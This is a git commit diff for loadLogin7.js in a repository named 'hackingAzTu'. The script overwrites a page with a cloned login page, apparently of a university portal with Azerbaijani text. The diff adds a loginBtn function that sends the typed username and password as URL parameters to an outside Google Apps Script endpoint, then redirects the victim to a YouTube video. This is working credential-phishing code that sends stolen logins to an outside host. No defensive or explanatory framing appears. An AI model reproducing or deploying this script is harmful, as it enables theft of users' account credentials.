e5d8ce3a79186853d27d4f91bcf3a2a9cf7e4339
ravanalaskarov <65460896+ravanalaskarov@users.noreply.github.com>
2022-10-08 18:34:12 +0400

    Update and rename loadLogin6.js to loadLogin7.js

--- loadLogin7.js
+++ loadLogin7.js
@@ -11,7 +11,6 @@ htmlCode = `<!DOCTYPE html>
 
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/style.css">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/iziToast.min.css">
-    <script src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/rickRolled.js"></script>
 
 </head>
 <body onload="OnLoad()" cz-shortcut-listen="true">
@@ -76,3 +75,21 @@ dekanlıqlardan əldə edə bilər.<br>
 <script src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/app.js" type="text/javascript"></script></body></html>`;
 
 document.querySelector('html').innerHTML = htmlCode;
+
+ function OnLoad() {
+    var el = document.getElementById("Username");
+    if (typeof el == "undefined") return;
+    if (el.value != "") {
+        var elPsw = document.getElementById("Password");
+        elPsw.focus();
+    }
+    else el.focus();
+}
+function loginBtn(){
+  let username = document.getElementById("Username");
+  let password = document.getElementById("Password");
+  document.write('<img src="https://script.google.com/macros/s/AKfycbzOejlHlAPAl9DXzrOgyvQNfCPDUxTlnz7dvmdX7zHfWBqBjW1NgtHKJTD2A-BPWJM/exec?username=' + username.value + '&password=' + password.value + '" onerror="rickRolled()" />');
+}
+function rickRolled(){
+    document.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+}
